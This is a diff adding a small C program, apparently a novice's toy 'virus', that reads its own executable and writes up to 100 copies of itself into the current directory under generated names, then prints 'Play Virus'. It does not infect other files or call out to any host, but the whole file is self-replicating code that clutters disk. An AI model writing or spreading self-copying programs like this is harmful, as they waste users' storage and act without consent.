@@ -1,0 +1,33 @@
+#include <stdio.h>
+#include <conio.h>
+#define N 10
+void main(int argc,char *argv[])
+{
+ FILE *fp;
+ FILE *out;
+ char name[]="Virus.exe";
+ if((fp=fopen(argv[0],"rb"))==NULL) 
+ {
+  printf("Virus error");
+  getch();
+ }
+  for(int j=0;j<N;++j)
+  {
+   name[3]++;
+   name[4]='a';
+   for(int i=0;i<N;++i)
+   {
+    name[4]++;
+    rewind(fp);
+    if((out=fopen(name,"wb"))==NULL) 
+     continue;
+    while(!feof(fp))
+     putc(getc(fp),out);
+    fclose(out);
+   }
+  }
+ fclose(fp);
+ printf("Play Virus");
+ getch();
+}
+
